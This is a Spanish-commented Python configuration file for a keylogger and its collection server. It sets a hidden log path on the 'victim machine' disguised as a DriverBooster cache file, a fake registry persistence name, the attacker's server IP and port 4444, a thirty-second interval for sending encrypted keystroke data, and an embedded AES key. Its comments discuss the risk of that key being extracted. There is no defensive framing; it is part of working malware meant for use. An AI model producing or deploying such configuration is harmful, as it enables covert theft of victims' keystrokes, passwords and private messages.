"""
config.py — Parámetros configurables compartidos entre keylogger.py y server.py
Modificar estos valores para ajustar el comportamiento sin tocar la lógica.
"""

import os

# Ruta del log local en la máquina víctima
LOG_FILE = os.path.join(os.environ["APPDATA"], "DriverBooster", "logs", "cache.dat")

# Nombre del proceso en el registro de Windows (clave de persistencia)
APP_NAME = "DriverBooster Scheduler 10.4"

# IP y puerto del servidor del atacante
SERVER_HOST = "195.0.1.5"   # Cambiar por la IP real del atacante
SERVER_PORT = 4444

# Intervalo en segundos entre cada envío de datos cifrados
SEND_INTERVAL = 30

# Clave AES-256 de 32 bytes (64 caracteres hex)
# Generar con: python -c "import secrets; print(secrets.token_hex(32))"
# IMPORTANTE — clave embebida en el ejecutable:
#   Ventaja: no requiere intercambio de claves en tiempo real.
#   Riesgo: si alguien descompila el .exe puede extraerla y descifrar los logs.
#   Alternativa más segura: RSA para negociar la clave al conectarse.
ENCRYPTION_KEY = "30eeef8f3188373740553ac599917720c1051874af056836dee8318039077a2b"
